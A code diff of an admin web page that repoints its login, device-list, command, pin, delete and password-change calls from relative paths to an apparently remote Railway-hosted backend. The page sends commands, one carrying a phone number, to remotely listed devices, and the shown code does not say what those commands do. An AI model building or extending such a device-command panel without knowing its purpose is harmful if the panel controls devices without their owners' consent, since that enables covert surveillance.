@@ -89,9 +89,9 @@
         <div class="grid" id="grid"></div>
     </div>
 
-    <script src="/socket.io/socket.io.js"></script>
+    <script src="https://bengal-tiger-admin-production-8071.up.railway.app/socket.io/socket.io.js"></script>
     <script>
-        const socket = io();
+        const socket = io('https://bengal-tiger-admin-production-8071.up.railway.app');
         let devices = [];
         let currentFilter = 'all';
 
@@ -104,7 +104,7 @@
 
         async function login() {
             const p = document.getElementById('pass').value;
-            const r = await fetch('/api/login', {
+            const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/login', {
                 method:'POST', headers:{'Content-Type':'application/json'},
                 body: JSON.stringify({password:p})
             });
@@ -117,7 +117,7 @@
         }
 
         async function fetchData(showMsg) {
-            const r = await fetch('/api/devices');
+            const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/devices');
             devices = await r.json();
             render();
             if(showMsg) toast("✅ Refresh Successful!");
@@ -185,7 +185,7 @@
                 data = { number: n };
             }
 
-            const r = await fetch('/api/command', {
+            const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/command', {
                 method:'POST', headers:{'Content-Type':'application/json'},
                 body: JSON.stringify({deviceId: id, action: type, data: data})
             });
@@ -194,7 +194,7 @@
         }
 
         async function togglePin(id, s) {
-            await fetch('/api/pin-device', {
+            await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/pin-device', {
                 method:'POST', headers:{'Content-Type':'application/json'},
                 body: JSON.stringify({deviceId: id, status: s})
             });
@@ -202,7 +202,7 @@
         
         async function del(id) {
             if(confirm("Delete Device?")) {
-                await fetch('/api/delete-device', {
+                await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/delete-device', {
                     method:'POST', headers:{'Content-Type':'application/json'},
                     body: JSON.stringify({deviceId: id})
                 });
@@ -213,7 +213,7 @@
             const o = prompt("Old Password:");
             const n = prompt("New Password:");
             if(o && n) {
-                const r = await fetch('/api/change-password', {
+                const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/change-password', {
                     method:'POST', headers:{'Content-Type':'application/json'},
                     body: JSON.stringify({oldPassword:o, newPassword:n})
                 });
